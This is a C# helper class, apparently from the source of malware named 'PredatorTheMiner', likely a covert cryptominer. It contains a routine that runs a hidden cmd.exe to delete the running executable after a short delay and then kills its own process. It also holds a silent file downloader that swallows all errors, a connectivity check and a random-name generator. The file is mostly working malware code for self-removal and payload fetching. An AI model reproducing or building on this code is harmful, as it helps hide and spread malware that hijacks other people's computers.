﻿using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace PredatorTheMiner
{
	public class Helper
	{
		public static void DeleteMe()
		{
			try
			{
				ProcessStartInfo Flash = new ProcessStartInfo
				{
					Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + (new FileInfo((new Uri(System.Reflection.Assembly.GetExecutingAssembly().CodeBase)).LocalPath)).Name + "\"",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					FileName = "cmd.exe"
				};
				Process.Start(Flash).Dispose();
				Process.GetCurrentProcess().Kill();
			}
			catch { }
		}

		public static string RandomString(int size)
		{
			try
			{
				string res = "";
				Random rand = new Random();
				for (int i = 0; i < size; ++i)
					res += (char)(rand.Next('a', 'z' + 1));
				return res;
			}
			catch { return null; }
		}

		public static void DownloadFile(string url, string file_save)
		{
			try
			{
				new WebClient().DownloadFile(url, file_save);
			}
			catch { }
		}

		public static bool SiteConnection(string url)
		{
			try
			{
				using (WebClient wc = new WebClient())
					using (wc.OpenRead(url))
						return true;
			}
			catch
			{
				return false;
			}
		}
	}
}
